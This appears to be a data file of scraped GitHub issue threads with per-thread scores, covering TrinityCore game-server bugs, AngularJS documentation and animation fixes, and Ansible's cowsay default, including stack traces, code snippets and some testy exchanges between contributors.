TrinityCore/TrinityCore/20714,0.09615406500000001,TrinityCore,TrinityCore,Anub'rekhan not linked to his Crypt Guards.,3990,41,41,0,0,"Description If I am inside Naxxramas, I can pull one of Anub'rekhan's Crypt Guards without aggroing the other Crypt Guard or Anub'rekhan himself. Current behaviour It is possible to aggro only Anub'rekhan or one of the Crypt Guards if we aggro them from the side. Expected behaviour Pulling any of the Crypt Guards or Anub'rekhan himself will result in all of them getting aggroed. Steps to reproduce the problem  CHANGEME Step 1 include entries of affected creatures / items / quests with a link to the relevant wowhead page.   Step 2 Step 3  Branch(es) 3.3.5, I don't know which branch TC rev. hash/commit TrinityCore rev. 607034064f04 2017-10-07 171334 +0200 (3.3.5 branch) (Win64, RelWithDebInfo, Static) (authserver) TDB version  TDB_full_world_335.63_2017_04_18 Operating system Windows 10  Is it normal, Crypt Guards appears only on 25man?  So I should post the top one which you said will work in the querry, or will it be updated in the official TC?  One more thing @friend, the query you added does work if Anub'rekhan is pulled first, however it does not work if his Crypt Guards are pulled first, I can still pull each one of them from the side, kill them and then engage the boss without adds at the start.  No this must be fixed in core side, also when you pull the boss a set combat with zone is called and the 2 guards will enter the combat.  Maybe @friend would like to pick up the challenge to see if he can find out what can be done about that action in the SAI core source?  It would be incredible if someone could start working on this issue, since it creates a lot of problem in MC and sub-raids on my server which is  hosting vanilla as end-game content, is there a forum where I can ask some more complicated questions about TC?  Was digging into this issue earlier, call for help only works when creature has a victim so its kinda buggy for some reason when used with aggro event (didnt have time to check why, through) You can use SET_IN_COMBAT_WITH_ZONE (38) with target CREATURE_GUID (10), but it may be a bit of a hack.  The easiest way is to delay the call of help by 1 secs.  @friend I think thats even more hacky solution than mine tho D  @friend maybe not - it might sound strange, but in some of my almost expired memories from WotLK retail I recall creatures waiting 1-2 seconds before answering a call for help P  @friend alright, fair enough, still weird tho  Yes it makes sense the text is displayed then after 1-2 secs npcs will enter combat.  Just put call of combat with boss, when Crypt Guards enter in combat (you can do it using EnterCombat(Unit* who) in a ScriptedAI)  Yes but in this case the SAI action mut be fixed.  Will an issue like this be fixed in the 3.3.5 branch or will I have to do this manually?  Ideally it will be fixed in the TC source (3.3.5 / master), but it depends on someone coming up with a working solution.  One solution would be to add second optional parameter victim to CreatureCallForHelp. If noone comes up with better solution, I will open a PR with it.  Why nobody talks about formations? D  Sometimes you can't put creatures into formations like when they already are in one or, in this case, they're temporary summons  That's why I had a feeling that I am stupid and missed something, because four days and nobody's talking about formations.. there must be a reason.  I'm new to Trinity, but how many people are working on it?  Since working implies, by definition, some sort of revenue, 0  Yes, it all depends on how you define ""working"" or what you actually want to know. There is a certain number of members in the TrinityCore organization, but some are inactive and some are more active than others. And like ccrs said, none of them receive a salary.  If you wanna pay me a full-time job I'll gladly work on this silly project. Until then, you get fixes when they happen.  closed by 79f0e55  Apologies for the attitude in the past @friend , I didn't want to come off that way, I'm very grateful for the fix! ",27,0,143,0,0,165,8,
TrinityCore/TrinityCore/4603,0.0574643225,TrinityCore,TrinityCore,[GDB] Crash at Unit::IsIMmunedToSpellEffect,4377,19,216,0,0,"Hello, I have this crash recurrently  0  UnitIsImmunedToSpellEffect (this=0x7fff572a7000, spellInfo=0x7fffe8c8b800, index=0) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp11546     aura = 3     effect = &lt;value optimized out&gt;  1  0x0000000000b4d3d6 in SpellAddUnitTarget (this=0x7fff2cc61b00, target=0x7fff572a7000, effectMask=3, checkIfValid=&lt;value optimized out&gt;) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp956     targetGUID = &lt;value optimized out&gt;  2  0x0000000000b5f287 in SpellSelectEffectTargets (this=0x7fff2cc61b00, i=0, cur=...) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp2506     maxTargets = 0     pushType = PUSH_DST_CENTER     modOwner = 0x7fff7f44b000     effectMask = 3  3  0x0000000000b60577 in SpellSelectSpellTargets (this=0x7fff2cc61b00) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp717     implicitTargetMask = &lt;value optimized out&gt;     i = 0     processedTargets = 0  4  0x0000000000b61468 in Spellcast (this=0x7fff2cc61b00, skipCheck=true) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp3173  No locals. 5  0x0000000000b62b20 in SpellEventExecute (this=0x7fff2da38af0, e_time=2349594, p_time=0) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp6523  No locals. 6  0x0000000000ceba3f in EventProcessorUpdate (this=0x7fff7f44b280, p_time=342) at /home/game/origins/compil/darluok/src/server/shared/Utilities/EventProcessor.cpp47     Event = 0x7fff2da38af0  7  0x00000000008fb56c in UnitUpdate (this=0x7fff7f44b000, p_time=1462399696) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp302     __FUNCTION__ = ""Update""  8  0x000000000097e2d5 in PlayerUpdate (this=0x7fff7f44b000, p_time=342) at /home/game/origins/compil/darluok/src/server/game/Entities/Player/Player.cpp1542     now = &lt;value optimized out&gt;     pet = &lt;value optimized out&gt;  9  0x0000000000a641b6 in MapUpdate (this=0x7fffdfa5b000, t_diff=342) at /home/game/origins/compil/darluok/src/server/game/Maps/Map.cpp537     player = 0x7fff7f44b000     updater = {i_timeDiff = 342}     grid_object_update = {i_visitor = @friend}     world_object_update = {i_visitor = @friend}  10 0x0000000000a72381 in MapUpdateRequestcall() () No symbol table info available. 11 0x0000000000ce6911 in DelayExecutorsvc (this=0x7fffea3a3b40) at /home/game/origins/compil/darluok/src/server/shared/Threading/DelayExecutor.cpp52     rq = 0x7fff6efb3790  12 0x00007ffff76f1d47 in ACE_Task_Basesvc_run (args=&lt;value optimized out&gt;) at ../../ace/Task.cpp275     t = 0x7fffea3a3b40     svc_status = &lt;value optimized out&gt;  13 0x00007ffff76f30d1 in ACE_Thread_Adapterinvoke (this=0x7fffd6a1ed00) at ../../ace/Thread_Adapter.cpp98     exit_hook_instance = &lt;value optimized out&gt;     exit_hook_maybe = {instance_ = 0x0}     exit_hook_ptr = &lt;value optimized out&gt;  14 0x00007ffff5fa18ba in start_thread () from /lib/libpthread.so.0 No symbol table info available. 15 0x00007ffff5d0902d in clone () from /lib/libc.so.6 No symbol table info available. 16 0x0000000000000000 in ?? () No symbol table info available. Patch  wintergrasp Revision  57490ead833074bd83ae38be8ee50e9f9813759a  I suggest a firewall (at least software) for your server, it's really vulnerable.  Why ? I didn't get the point.  Custom fixes or maybe a pull request implemented like for example the Immunity handling?  No big custom fix, I've added some more immunities to Vehicles, but in the way Trinity dev have already done.  do you know if I desactivate GCC optimisation, I will have the targetGUID and the spell/aura ID?  (and what is the relationship with a firewall...!?!)  I'm saying that your french private server doesn't have a firewall and it's easily crashable / hackable ;)  /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp Nothing more to be said.  «  francophones, gratuits &amp; légaux World of Warcraft »  PUBLIC SERVERS ARE ILLEGAL BY ESSENSE  Please shut up. Thanks. (~&gt;Mods)  no one appreciates that kind of attitude. the people here work hard to get these things working and most if not all private servers benefit from it without giving much if anything back in return.  the most funny thing is they just know how to install a server and wait the money darluok, making money at it best. ",1,0,407,0,0,187,8,
TrinityCore/TrinityCore/6137,0.08389727,TrinityCore,TrinityCore,[LOOT/FIX] Brightly Colored Egg (45072),4347,61,52,0,4,"this is already in the database thus does not require adding  I'm currently not using the latest DB so I can't be certain they ware fixed but I don't remember seeing the fix and the values are different in my version.  @friend what part of the code below would you say is already in the DB? Do compare the values from my fix above with the values from the current DB below before you answer. Please reopen the issue since it is obvious the drop chance values are wrong in TDB 11.46 updated to e74135946d2cb2b6a522cfa979cfef0263a9fd8e and this can be confirmed by the link I provided in the first post.  The drop chances that are in DB atm are very similar... 0.6 vs 0.5, 0.5 vs 0.4  Yet they are wrong enough to need fixing &lt;IMG&gt; If you, in-game, can tell that an item drops 0.2% more using a different DB... I don't even know what to say. Minimum is 0, maximum is 100 and we are arguing over decimals... Thanks for the fix but I think our time would be better wasted with something more serious.  I give up, when I was told by others they won't post there fixes here because of the dev's attitude I did not understood them. Now I think I finally do understand ... You just told me that you don't care that the ""Elegant Dress"" (  ) doesn't have the same chance to drop as Spring Rabbit's Foot, Spring Circlet, Spring Flowers and Spring Robes (they should have the same chance) just because you don't think it'll have any difference for the players if the value is 0,3% less than is should be... You also told me that you don't care if the values in TDB are not correct and won't apply a fix because you consider it a waste of time.  That means you can't accept a no? Look at the god damn values again and tell if it is worth it, and why.  You are constantly rejecting fixes because they are not blizzlike, yet now you are rejecting a blizzlike fix because you think that the difference in the values is not big enough ... But the result is that players are wasting hours farming the ""Elegant Dress"" item during the 1 week Noblegarden event in hopes of getting the ""Dressed for the Occasion"" achievement year after year and can't get it while getting multiple copy's of the other 4 items that are supposed to have the exact same chance to drop ... Do note that while minuscule in terms of 0-100% the difference in drop chance is 250%  Constantly rejecting fixes? Do you have anything to back that statement? And what makes you think that your values are more correct than the current ones? I don't know if our values are correct either but since they are already in the DB and your changes introduce no significant changes, I (we) are not pushing it. Wowhead is based on empirical data, it is not a reliable source of data. There's no good way to get the exactly correct values (except for those loot table where you have, e.g, 10 items in a group and you know that one of those items has to drop) And about the 250%, I think your math is a little bit off. I would not like to continue this useless and stupid discussion.  nelgalno if you wish to change %'s then post udate queries. above fix is not needed thus rejected.  &lt;b&gt;Do you have anything to back that statement?&lt;/b&gt;  what makes you think that your values are more correct than the current ones?&lt;/b&gt; I did some research before posting here as evidenced by the links above. &lt;b&gt;And about the 250%, I think your math is a little bit off.&lt;/b&gt; 0.2 + 0.3 = 0.5% == 100% + 150% = 250% &lt;b&gt;post udate queries&lt;/b&gt;  yes the loot% on your thottbott, wowhead and other links are all momentairy, i challenge you to check it again in 2 weeks or even in 5, and see that the %chances have changed yet again. therefor you should NOT use hardcoded ChanceOrQuestChance but group them accordingly and set a rough chance for them as a whole. 0.2+0.3 = 0.5 (that is correct) but the increase in % = 0.3/0.2 = 150% not 250%  fix is rejected, my final statement, and im the loot dev  They held those values since the time of the Noblegarden event == more than a month ago ... If we assume that the current TDB value is 100% + the 150% increase I suggest equals 250% ... P.S. I don't care, it is your choice to accept or reject the fix. I know that I did my best to provide the information/evidence that the values in TDB are incorrect and you choose to ignore it ... ",14,0,204,0,0,99,7,
TrinityCore/TrinityCore/7994,0.0701492185,TrinityCore,TrinityCore,Arena frames ,710,1,6,0,3,"When you use addons like Gladius and enter to an arena before your teammates, they appear in Gladius like they were your enemies. Also happens with blizzard arena frames. Same problem ♢  rev. 2012-10-05 233116 +0200 (ca55807+) (Unix, Release)  Confirmed! Revision a7d8a65bd0a95f21f1e350cefbef94ace20f69ec Database TDB.335.49 (with latest updates)  Confirmed!  Confirmed.  CONFIRMED!   will fix it, only makes sense that way anyway imo BattlegroundMgr.cpp  Working partially on a261231d3f345eb4cf4e4601cd1dba1506d6f989 Now only pets bug the partner interface (owner interface works fine), and the rest it's fine  confirm, frame is bugged in rev  Reopen this, confirm at 5a6eacfa3361c87c776915204caef9be2851486e ",1,0,29,0,0,29,3,
TrinityCore/TrinityCore/8105,0.07455975000000001,TrinityCore,TrinityCore,[4.3.4] Update object and player - player visibility,13188,90,162,0,6,"Core revision  7cc1b999a6f69056e88ffce04d2f26de292a6e11 Description  Console error with Object Update Failed between players, resulting in player being invisible for others. Happens randomly and sometimes whole packet is skipped for that player. All other objects are visible. Did some testing on it and seems sometimes logging out both players which don't see each other solves it, sometimes a server restart and other times changing the location of both players can do it. This can happen in two different ways  if there is only player a and b player a doesn't see player b or other way around /  both players don't see each other; if there are more players some players can see that player  but for some object update fails and they can't see him at all / player can't see some of the other players.  Example Object update failed for object 436 (Воil) for player Leikov (213) Object update failed for object 32 (Мentos) for player Leikov  (213) Object update failed for object 184 (Larvy) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213) Object update failed for object 1373 (Wilson) for player Leikov  (213) Object update failed for object 1391 (Death) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213).  This seems to happen also for pets, totems or in case of raid buffs. Maybe it is aura-related in some way? Anyone got anything new on this?  confirmed  Could this be due to limitation of player update fields sent to other players ( I mean these commits  /  ? I played around with it a bit and observed that modifying the number of update fields sent / sending them all can reproduce the bug each time two or more players meet, can something be bad there ?  Seems to be a wrong packet structure being send i think, if you check it handles the CMSG opcode that is being received and calsl the object failed. Soooo this could be because the packet has been sended wrong?  @friend prolly not. Objects/Npcs keep disappearing as well once 2 or more players reach in sight.  any temp solution?  None that I know of as of now ;(  anyone can help me, does it possible to make in game command, witch can repop player update? so it basicly make ppl visible if they use that command?  Still wondering who is assigning issue priorities.. Without object update working as intended there's no way to even play the game,but it's better to have spells as a higher priority..huh.  You are NOT supposed to use the 4.3.4 branch for production environments, it IS in alpha / beta state, and WILL have bugs. We (devs) work on whatever we WANT to work on, whatever is FUN for us to work on, not on some ""important"" bug because it prevents people from creating 4.3.4 private servers  I don't really care,I've fixed that on my local. Just wondering of whom is assigning priorities no matter the branch's current state as he clearly isn't paying attention or is just ignorant. I didn't say that I expect the 4.3 branch to have no bugs,master has enough already,anyways. And this isn't stopping anyone(or at least me) to get my stuff rolling ;)  @friend What exactly are you doing here? With that shitty attitude you might as well just leave.  please just be cool anyway hopefuly some devs can look at this, could be nice to have it fixed and IntelFreak share fix? or ..  You know, that makes us want to stop developing sometimes, you take tons and tons (thousands of lines, according to ohloh) of code, made by us / other contributors, modify it, claim that you have something working, and just don't share it back.  I do not care about any other user here weaving around aboot some fixes here they made that none of followers of TC can experience. It's crap, it's ignorant and it really ain't nice. I want to just let my fav db dev know that he is best at his work around here, Malcrom D  Would be nice if you mentioned exact steps to reproduce this as i had a hard time trying to figure it out. Im guessing more than 1 player must be involved so i can't test it alone.  one problem i can reproduce ,  player A duel with player B player A mage cast invisibility, player B stays without move after player A invisibility fades, player A cant see player B until player B move. thats just one visibility bug, but trying to find out other (perma invis until relog) bugs  that bug with invisibility seems fixed on latest rev, not sure about global player update visibility  @friend can you pls share your fix?  just to confirm bug still there ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Abnormally (606513) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Wlk (586392) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Agressive (351952) ERROR [NETWORKIO] Object update failed for object 606513 (Abnormally) for player Rychard (100037876) ERROR [NETWORKIO] Attempted to get value with size 3 in ByteBuffer (pos 2 size 16) [Stack trace /opt/RC_TC/bin/worldserver(_ZN12WorldSession6UpdateEjR12PacketFilter+0x8f0) [0xd30000] /opt/RC_TC/bin/worldserver(_ZN5World14UpdateSessionsEj+0x112) [0xdcd0e2] /opt/RC_TC/bin/worldserver(_ZN5World6UpdateEj+0x227) [0xdd2667] /opt/RC_TC/bin/worldserver(_ZN13WorldRunnable3runEv+0x1b4) [0x8de414] /opt/RC_TC/bin/worldserver(_ZN9ACE_Based6Thread10ThreadTaskEPv+0xa) [0xfd681a] /usr/local/lib/libACE-6.0.0.so(_ZN21ACE_OS_Thread_Adapter6invokeEv+0xa5) [0x7f99af463f75] /lib/x86_64-linux-gnu/libpthread.so.0(+0x6d8c) [0x7f99add9ad8c] /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f99adae4fdd] ]  I got this messages when tryin to tame beast (mb cuz last id in character_pet table is rly big?) =) If truncate tables character_pet / pet_aura / pet_spells / pet_spell_cooldown - everything going well...  still bug, please fix it  lol, go to AC webs and bump.  is it caused by some commit or that problem is from start?  can someone send file with packet communication on this error? i cant reproduce it on localhost -(  can use this for sniff it works ok  i could not 100% reproduce the error msg, but after some testing i figured out a stupid bug if you JUMP thru any portal client will stuck at loading screen. I didnt get any error msg for this however. anyway, problem is at Object_BuildMovementUpdate temp solution is to disable jump flags in the update object just comment these two lines hasFallDirection = self-&gt;m_movementInfo.bits.hasFallDirection; hasSplineElevation = self-&gt;m_movementInfo.bits.hasSplineElevation; (it can be found in two places, just below each other) after this, client loading didnt stuck anymore while jumping to portals..  so jumping while teleport makes you stuck? (someone tryed to reproduce this with jump + .tele? D  tryed it with tele to other map, no errors, but with jump + instanceportal its a 100% stuck for us  Confirmed, sometimes also seen on master.  still could not directly reproduce this update fail bug... it comes back randomly tho..  sniff with data fail (btw you can enably packet logging in core.. no need for sniffer in local..)  with wpp and search for CMSG_OBJECT_UPDATE_FAILED  @friend is easy to fix it, you need get some functions from update visibility from cmangos (they have implemented, Trinity no), and make some changes for get working it.  Walkum thx for help  @friend that is where you need to fix? Help please. Thank you.  share fix, please... (  also looking for solution /  yeah,  i want to know what code walkum said.  @friend Could you please link to this code or pm me?  Object update failed for object 17371279370823581417 (Doodad_InstanceNewPortal_Purple01) for player Mags (27) Object update failed for object 17371279375118548714 (Doodad_InstanceNewPortal_Purple_Skull01) for player Mags (27) Only I have left?  this partially fixes visibility, Creatures still sometimes, well a lot of the time don't load up on login/teleport. as well as game objects and players. However players seem to pop up out of the visibility issue over time when they move around/cast w/e.  How to repeat 2 players. player1 .tele gmis player2 .tele zula player2 .sum player1 and immediately press jump PROFIT! )  player 1 or 2 jumps?  For me, Spawn creatures on gm island = when you tele there or login creatures are invisible until you do .respawn.  yep, problem is still here.  problem still exists afaik... and another way to reproduce, set all speeds to 0 in any creature_Template, it will write the update error  Speeds equal to 0 should not be allowed for any object - client explicitly rejects such objects  thats fine but in tdb some creatures (cannons?) have speed 0 so players can not move with them. anyway, after cleaning the db of 0 speeds, the update fail error still happens, sometimes for 1 unit, whole instance, or  even for self. i made some changes to the core, all smsg_update_objects packets get stored in vector for each player, and when a player gets the failed error it dumps all packets to a parsable bin file,   it clears the packet list after all smsg_new_world packets (when teleporting) to minimize the number of packets saved. i'll run this for a while then upload the bins here. example Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515)  was only 1 SMSG_UPDATE_OBJECT packet in his dump which had the entry of Orgrimmar Thief UNIT_FIELD_HEALTH 0/0 this looks strange to me... how ever, i could not reproduce the bug, the creature has &gt;0 hp in db  updates_8515_parsed.txt Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515) (Unit Entry 42594 Low 1269632 is the npc) updates_27473_parsed.txt Object update failed for object 17379456185396262882 (Murky) for player Tfh (27473) (Unit Entry 15186 Low 161762 is the npc) updates_157003_parsed.txt Object update failed for object 155636 (Flink) for player Chupakabra (157003) updates_153694_parsed.txt Object update failed for object 140454 (Misral) for player Tapolynokill (153694) updates_146553_parsed.txt Object update failed for object 157256 (Tokitozuka) for player Enforced (146553) updates_105663_parsed.txt Object update failed for object 128558 (Epherandes) for player Manigo (105663) updates_122856_parsed.txt Object update failed for object 155636 (Flink) for player Smash (122856) the bugged packet is always the last one in the files zip bins + parsed with wpp, no parse errors  Your method of debugging this is not reliable - client sends CMSG_OBJECT_UPDATE_FAILED when it received VALUES block for an object it cannot see (didn't receive CreateObject or movement block had bad data); this means it will never fail because of bad values in updatefields  okey, then why arent the create packets sent corretcly?  The packets sended correctly, but if you send not allowed values by client side in the SMSG_OBJECT_UPDATE (e.g speed=0) the client ignore this object and send to server  CMSG_OBJECT_UPDATE_FAILED, but the problem is fixed, check your database and change the not allowed values to not receive this error  as i wrote above, there is no npc with speed 0 in db, and most of the errors come from players, i dont think they can have 0 speeds...  What about players that have auras with -100% movement speed? Maybe we are handling these wrong  No ^^ it's auras which handle Movement ) For ex. Suspend gravity! How do i know? Because i'm working on gunship_battle 4.3.4 and everytime i use movement flag i get that error ^^ Like when you enter the Transport you actually do get an Spell (Aura), that says, that you'r eon the Transport and then it wants to update  If you have a new way to reproduce it, why don't you tell us what it is?  didn't i do that before? Try any Spells, which will update the movement of anything..  No, I am not getting issues with them, you could at least give me a scenario how to cast it, what to cast, who to target and stuff  shauren was right, any speed mods which set speed to 0 create errors.. expample spell 102937 Demon Grip Root - 100% speed to reproduce add aura 102937 to a player (should work winth any unit tho) run/fly out of view distance of it go back you will notice that most of 'worldobjects' which were sent in the same packet are not visible you will get the first update failed error if any of those objects send an update example a player unequips an item  btw, why is this closed?  did some more tests i logged all speed vars in all create packets, none of them was 0, so this isnt to source of the bug (adding -100% speed auras still reproduce the error, but those are not used in TC currently for any scripts afaik) another thing i tried is, i added a check when core receives the fail packet, and checked m_clientGUIDs for the given guid and m_clientGUIDs always had the guid in list, so the bugged object is always visible from core side for the player so i guess somehow the createblock is not sent to the client any ideas?  Maybe an error in the order the packets are sent, or they way they are processed by the client? as in, we send the CreateObject first but the client processes the UpdateValues before it?  i still dont know why is this closed, the bug is still happening as before.. ",41,0,604,0,0,500,32,
angular/angular.js/1438,0.052317907,angular,angular.js,Broken sample code: http://docs.angularjs.org/api/ngResource.$resource,4387,46,17,0,2,"The sample code for  is broken. See the first comment for a fix     You must reference the angular-resource js script file.    Then you must declare a module dependency on     'ngResource' via angular.module('myapp', ['ngResource']).  This URGENTLY needs to be fixed.  People keep getting stuck on this issue.  Yeah, count one more person who wasted time on this. You can eventually figure it out by searching around the net and reverse engineering other peoples code )  plus one, just lost an hour wondering about this too.  Ran headfirst into this one as well.  plus one me too. Thanks  It's open issues like this that make me wonder if I should continue developing with Angular. I mean this with 100% respect for what you all have accomplished here.  I'm just trying to point out that documentation is really important for people like me who are trying to choose which framework to use.  Fork. Branch. Fix. Pull request?  So, had a look at this example and it is broken in number of ways, in addition to the ones already listed  It is still using old controller syntax ( instead of ) We are missing a module with a resource created in a factory Google buzz is gone ( so the example must be changed anyway  I don't know, if there are no other ideas we could simply change it to the projects list from the home page..  why are you doing this to us?  Angular.js has over 700 closed pull requests. Just saying.  but this is really urgent. I couldn't find any advanced example for $resource.  Normally I agree with the philosophy if you find a problem why not propose a solution. However this is one of the first things people new to angular are trying to grok. They are thinking more WTF rather than how can I fix this.  Let them get through hello world before expecting pull requests.  I went through hello world 6 months ago. I have made 3 productive angular apps, yet I spent a full day trying to figure out how $resouce works basically. WTF  @friend @friend I sympathise completely, it's always fair to raise a ticket to ask an expert to fix a problem. What's not fair (or helpful) is the attitude that ""WTF"" conveys. This is free software, built with the time and creative energy of individuals who ask for nothing in return. They deserve a little better than ""WTF"", don't you agree? When I hear that attitude my gut reaction (that I do usually restrain) is ""fix it yourself"".  I apologize. I was unrightfully  provoked. Sorry!  Yes Richard you are right. I guess a bit of frustration comes from not having more access to what the core team is thinking.  Not for our curiosity but because it would help us plan ways to help the project.  Are any if the core team working full time on Angular?  (if they have only 10% allocation we can optimize our help for this)  What are they currently working on or starting in the near future?  (sparse commits and roadmap don't tell much)  How do we contact them?  Does Igor list his email?  I am trying to help fix a bug in the core code and need to coordinate but haven't gotten a response via GitHub or google groups.   Leaders of a free project do deserve our respect and thanks.  The flip side is they have to spend time on communication, coordination, and leadership, or delegate it.  The more the path is lit the more the community can help. On Jan 9, 2013, at 414 AM, ""Richard Marr"" notifications@friend.com wrote  Fair enough!  Something as basic as $resource should be properly documented. WTF is the appropriate reaction. Fixing it yourself is too.  I would like to contribute more appropriate documentation and samples, but I couldn't figure how to make the sample code pipeline work. On Wed, Jan 9, 2013 at 942 PM, Iwein Fuld notifications@friend.com wrote  kmayer cool! What do you mean by ""how to make the sample code pipeline work""? Is it related to the Angular build, or to the code that is in the current sample? I think that you can best ask in the mailing list, there is quite a bit of activity there.  This should have been closed 3 months ago together with Pull Request #2099 . Here an screenshot showing this info on the current docs of ngResource.$resource     As part of our effort to clean out old issues, this issue is being automatically closed since it has been inactivite for over two months. Please try the newest versions of Angular ( and ), and if the issue persists, comment below so we can discuss it. Thanks! ",17,15,147,0,0,118,13,
angular/angular.js/4401,0.0459613665,angular,angular.js,ngShowDirective adds the ng-hide-remove class when the element is already hidden,5387,63,80,0,8,"ngShowDirective watches attr.ngShow, and adds ng-hide-remove class even when the attr.ngShow value ""changes"" from true to true (or from false to false). Animations should only be applied if the actual value of ng-hide has changed if ( toBoolean(value) !== toBoolean(oldValue) ) {   $animatetoBoolean(value) ? 'removeClass'  'addClass'; }  I can't reproduce the problem here  - Can you modify the Plunker to demonstrate the issue?  Thanks, @friend.  Great idea! This reveals the issue, when you type in the new text field I added.   P.S. I'd be happy and honoured to submit a pull request for this issue if you like -)  Hmm... actually, my naïve solution doesn't work - the ng-show directive wouldn't initially add the ng-hide class (since value and oldvalue are both ""undefined"" at the start, so the boolean value doesn't look like it's ""changed"".  Needs more thought...  @friend how's this coming? I can make a quick PR towards the end of the week unless you're still on this.  I'm a bit stuck, to tell you the truth. My fix (above) only works for ngHideDirective, and that's only because of an accident - namely that if the initial toBoolean(oldValue) is false, this matches the fact that we haven't yet added or removed either of the ng-hide-add and ng-hide-remove classes; hence doing nothing is appropriate. The ngShowDirective is more complicated.  If value and oldValue are both initially ""undefined"" or falsy, we must take action to add ng-hide, even though it doesn't seem like the model has changed.  Otherwise '''&lt;span ng-show=""undefinedValue""&gt;''' will fail to be hidden at start up. Is there a way to tell if this is the first time the $watch() function has been called?  Then we could do this ''' var ngShowDirective = ['$animate', function($animate) {   return function(scope, element, attr) {     scope.$watch(attr.ngShow, function ngShowWatchAction(value, oldValue){       if ( isFirstTimeThisWatchHasFired || (toBoolean(value) !== toBoolean(oldValue)) ) {         $animatetoBoolean(value) ? 'removeClass'  'addClass';       }     });   }; }]; ''' Any ideas?  You could try to define a variable outside of the watch and check if it is true. Also take a look at $compile to see if you setup the addClass/removeClass guard there  Thanks @friend! I'm embarrassed that the solution is so obvious -)  I added the local variable, and it now works as I'd expect.  I'll send a pull request ASAP.  Not sure how to add tests for this feature though.  Any advice?  A good place to start is with  Just add another speak and try to use the mocking system that the two existing tests are using. To run tests, do the following  npm install ./node_modules/.bin/bower install grunt autotest  Then when everything is passing and your code is ready to go, try the following  grunt test  After that change your commit message style to follow AngularJS' style Take a look at some of the commits here  @friend how's this coming along? Do you need me to help out in any way?  Hi @friend. I've sent pull request #4479, and I think I've formatted it correctly now (my first ever pull request - very exciting stuff!) I just had a brief holiday in Sydney, so haven't had a chance to write the tests.  Also, I've never written unit tests in the framework used in Angular.  I'd be keen to try, and from the looks of things, this is a fairly simple example to get started on. I've been reading up on how to test code like this, and it's a great way to get deeper into how Angular works, so if there's no rush to get this fixed, I'd be happy to tackle the tests.  I've got a huge stack of work to catch up on, though, so it won't happen this week.  If you have the time and the inclination to write the tests, I'd be happy to learn from your example - I'll use the lesson to fix something else in the Angular code base -)  @friend no problem. I can handle the tests. I'm trying to close just about all the animation PRs before 1.2 is released.  @friend great work for fixing this with ngShow/ngHide. Turns out that after looking more into the problem, $animate is causing the issue and the CSS class checking has to occur inside of it. So the solution has to fix it for all cases. The ngShow/ngHide PR you made only works for that one ($animate.addClass / removeClass was had this issue to begin with). Here's the new PR  a working version of your demo with the new PR  for closing your PR on this. Thank you for putting the work into it.  Thanks Matias -) Interesting.  My first thought was to check hasClass(), but that felt DOM-centric and implementation-specific.  I was afraid I was falling into my old jQuery habits (storing ""model"" in DOM) -)  That's not a criticism; I think the area that you've amended is at the same level of abstraction as the fix you've added.  It felt awkward to add class-level checks inside the ngShowHide.js file though. I like how simple the general solution is now. Thanks so much for your help and encouragement with this - I've really enjoyed the experience.  It's my first contribution to OSS, and thanks to you and your kind and helpful attitude, I'm definitely going to do more! Grant On 24/10/2013, at 954 AM, Matias Niemelä notifications@friend.com wrote  @friend happy to hear that the fix is good. And thanks for the feedback about the OSS stuff. I'm happy to help. Keep contributing! You learn a lot when working on an open-source project.  Landed as ",18,13,316,0,0,171,16,
ansible/ansible/10530,0.09371125699999999,ansible,ansible,Cowsay should not be enabled by default,3278,50,25,0,1,"Having cows fill my screen when running a playbook is not the expected behavior, and makes it hard to visually parse the output of ansible. Since cowsay is enabled not by a setting, but just by the presence of the cowsay binary on the system, it is a surprise whether or not cows will appear when I run ansible-playbook on a new system. Instead of putting the burden of setting an environment variable on people who don't want cows, the default should be normal text output with no cows. The environment variable should be renamed from ""ANSIBLE_NOCOWS"" to ""ANSIBLE_COWS"". This way, we get a sane, unsurprising default, but people can still get their cows if they so desire.  Pure heresy, I say!  wink  I don't see what the problem is here. If you have cowsay installed, you obviously want to use it. If not, you'd uninstall it.  plus one I have a recurring nightmare of demoing a new CD system to all of engineering and having cows fill my screen and getting fired.   Just wanted to point out one thing that I wasn't sure if the original poster noticed In ansible.cfg you can set if you would like to set this in your environment, just set the configuration option in the ansible.cfg file.   I agree this is very annoying. I also think your attitude towards this very disappointing. Yes, this is a fun feature. But it's fun exactly three times, then you realize your ansible output is now basically unreadable. I can set it in a config file, yes, but when using e.g. a pull configuration, this isn't really an option. I have to ensure to enable an option in a config file on every host that might ever run some ansible command, just so I can get rid of some easter-egg I never even enabled in the first place. Isn't ansible supposed to make our lives easier? Maybe consider the fact that many people complain about it and even send PRs as a sign that this is annoying to many people, and please reconsider disabling it by default.  Hay there. I'm moo here. I herd you mooved on, but cowbell we re-open this issue. Stop hoofing around, I think you've milked this joke long enhoof. Please remoove this behavior, I beg of you, leather you like it or not, it's caused issues even though there is no farm intended.  I was calfway through provisioning my EC2 servers and this bull appeared. But I digrass, this joke is the worst I'd heifer seen. It's the last straw. I've got no beef with you, but cattle you see that people are upset?  Please reconsider. Bessie of luck to you all.  A co-worker (not cow-orker!) suggested I weigh in on this thorny subject.  You should be careful with features like this they can ruin product demonstrations if they fire off unexpectedly.  Many years ago I was demonstrating something in Linux.  I had to use sudo and I got one of the joke responses that it used to give when you mistyped your password.  'Oh yes, the err, author, does have a bit of an, um, sense of humour.'  It's unexpected so you've got nothing prepared, and it makes it look as though the product designers are not taking their role seriously.  I know that both Ansible and sudo are serious products, but my audience may not.  My biggest beef with this is that the beef takes way too much vertical space. Having it default to off would be preferred.  I see what you did there... ",15,2,109,0,0,85,4,
